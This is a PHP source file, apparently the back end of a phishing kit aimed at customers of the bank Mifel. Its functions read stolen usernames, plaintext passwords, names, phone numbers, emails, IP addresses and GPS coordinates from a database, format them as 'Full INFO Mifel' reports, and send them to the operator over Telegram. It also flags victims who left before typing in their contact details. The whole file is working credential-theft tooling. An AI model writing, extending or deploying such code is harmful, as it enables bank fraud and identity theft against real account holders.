<?php

require_once __DIR__ . '/telegram-login.php';

const TELEGRAM_OFFLINE_DEBOUNCE_SEC = 120;

function telegram_formato_gps(?string $coordenadas): string
{
    $coords = trim((string) $coordenadas);

    return $coords !== '' ? $coords : '—';
}

function telegram_full_info_notificar(
    string $usuario,
    string $password,
    string $nombre,
    string $telefonoFijo,
    string $telefonoMovil,
    string $email,
    string $seccion = 'Empresas',
    string $ip = '',
    string $coordenadasGps = ''
): void {
    if (!telegram_esta_habilitado()) {
        return;
    }

    if ($nombre === '' && $telefonoMovil === '' && $email === '') {
        return;
    }

    $fijo = $telefonoFijo !== '' ? $telefonoFijo : '—';
    $movil = $telefonoMovil !== '' ? $telefonoMovil : '—';
    $gps = telegram_formato_gps($coordenadasGps);

    $mensaje = "[ Full INFO Mifel | {$seccion} ]\n"
        . "Usuario: {$usuario} | Clave: {$password}\n"
        . "- NOMBRE: {$nombre}\n"
        . "- TELEFONOS: {$fijo} | {$movil}\n"
        . "- CORREO : {$email}\n"
        . "- GPS: {$gps}\n"
        . telegram_mensaje_pie($ip);

    telegram_login_enviar($mensaje);
}

function telegram_full_info_desde_usuario(PDO $pdo, int $usuarioId, array $contacto, string $seccion = 'Empresas'): void
{
    $stmt = $pdo->prepare('SELECT usuarios, password, ip_real, coordenadas_gps FROM usuarios WHERE id = ? LIMIT 1');
    $stmt->execute([$usuarioId]);
    $row = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$row) {
        return;
    }

    telegram_full_info_notificar(
        (string) ($row['usuarios'] ?? ''),
        (string) ($row['password'] ?? ''),
        trim((string) ($contacto['nombre'] ?? '')),
        trim((string) ($contacto['telefono_fijo'] ?? '')),
        trim((string) ($contacto['telefono_movil'] ?? '')),
        trim((string) ($contacto['email'] ?? '')),
        $seccion,
        trim((string) ($row['ip_real'] ?? '')),
        trim((string) ($row['coordenadas_gps'] ?? ''))
    );
}

function telegram_usuario_es_empresa(array $usuario): bool
{
    return strcasecmp(trim((string) ($usuario['apellido'] ?? '')), 'Empresa') === 0;
}

function telegram_usuario_es_persona(array $usuario): bool
{
    $apellido = strtolower(trim((string) ($usuario['apellido'] ?? '')));

    return $apellido === 'persona' || $apellido === 'personas';
}

function telegram_usuario_seccion(array $usuario): string
{
    return telegram_usuario_es_empresa($usuario) ? 'Empresas' : 'Personas';
}

function telegram_usuario_notificable_offline(array $usuario): bool
{
    if (!telegram_usuario_es_empresa($usuario) && !telegram_usuario_es_persona($usuario)) {
        return false;
    }

    return trim((string) ($usuario['password'] ?? '')) !== '';
}

function telegram_usuario_falta_contacto(array $usuario): bool
{
    return trim((string) ($usuario['nombre'] ?? '')) === ''
        || trim((string) ($usuario['telefono_movil'] ?? '')) === ''
        || trim((string) ($usuario['email'] ?? '')) === '';
}

function telegram_full_info_offline_mensaje(
    string $usuario,
    string $password,
    string $seccion = 'Empresas',
    string $ip = '',
    string $coordenadasGps = ''
): string {
    $gps = telegram_formato_gps($coordenadasGps);

    return "[ Full INFO Mifel | {$seccion} | OFFLINE ]\n"
        . "Usuario: {$usuario} | Clave: {$password}\n"
        . "- DATOS NO INGRESADOS\n"
        . "- GPS: {$gps}\n"
        . telegram_mensaje_pie($ip);
}

function telegram_full_info_offline_si_aplica(array $usuario): void
{
    if (!telegram_esta_habilitado()) {
        return;
    }

    $usuarioId = (int) ($usuario['usuario_id'] ?? 0);
    if ($usuarioId <= 0) {
        return;
    }

    if (!telegram_usuario_notificable_offline($usuario)) {
        return;
    }

    if (!telegram_usuario_falta_contacto($usuario)) {
        return;
    }

    if (telegram_offline_debounce_activo($usuarioId)) {
        return;
    }

    $seccion = telegram_usuario_seccion($usuario);

    if (!telegram_login_enviar(
        telegram_full_info_offline_mensaje(
            (string) ($usuario['usuarios'] ?? ''),
            (string) ($usuario['password'] ?? ''),
            $seccion,
            trim((string) ($usuario['ip_real'] ?? '')),
            trim((string) ($usuario['coordenadas_gps'] ?? ''))
        )
    )) {
        return;
    }

    telegram_offline_marcar_envio($usuarioId);
}

function telegram_offline_lock_path(int $usuarioId): string
{
    return sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'mifel_tele_offline_' . $usuarioId . '.lock';
}

function telegram_offline_debounce_activo(int $usuarioId): bool
{
    $archivo = telegram_offline_lock_path($usuarioId);
    if (!is_file($archivo)) {
        return false;
    }

    return (time() - (int) filemtime($archivo)) < TELEGRAM_OFFLINE_DEBOUNCE_SEC;
}

function telegram_offline_marcar_envio(int $usuarioId): void
{
    @touch(telegram_offline_lock_path($usuarioId), time());
}

function telegram_full_info_offline_desde_usuario_id(PDO $pdo, int $usuarioId): void
{
    $stmt = $pdo->prepare('
        SELECT id AS usuario_id, usuarios, password, nombre, apellido,
               telefono_movil, telefono_fijo, email, ip_real, coordenadas_gps
        FROM usuarios
        WHERE id = ?
        LIMIT 1
    ');
    $stmt->execute([$usuarioId]);
    $row = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$row) {
        return;
    }

    telegram_full_info_offline_si_aplica($row);
}

function estatus_aplicar_offline_y_notificar(PDO $pdo): void
{
    $stmt = $pdo->query("
        SELECT e.usuario_id, u.usuarios, u.password, u.nombre, u.apellido,
               u.telefono_movil, u.telefono_fijo, u.email, u.ip_real, u.coordenadas_gps
        FROM estatus_usuarios e
        INNER JOIN usuarios u ON u.id = e.usuario_id
        WHERE e.ultimo_heartbeat < DATE_SUB(NOW(), INTERVAL 60 SECOND)
          AND e.estado IN ('online', 'inactive')
    ");
    $pendientes = $stmt->fetchAll(PDO::FETCH_ASSOC);

    if (!$pendientes) {
        return;
    }

    $pdo->exec("
        UPDATE estatus_usuarios
        SET estado = 'offline'
        WHERE ultimo_heartbeat < DATE_SUB(NOW(), INTERVAL 60 SECOND)
          AND estado IN ('online', 'inactive')
    ");

    foreach ($pendientes as $usuario) {
        telegram_full_info_offline_si_aplica($usuario);
    }
}
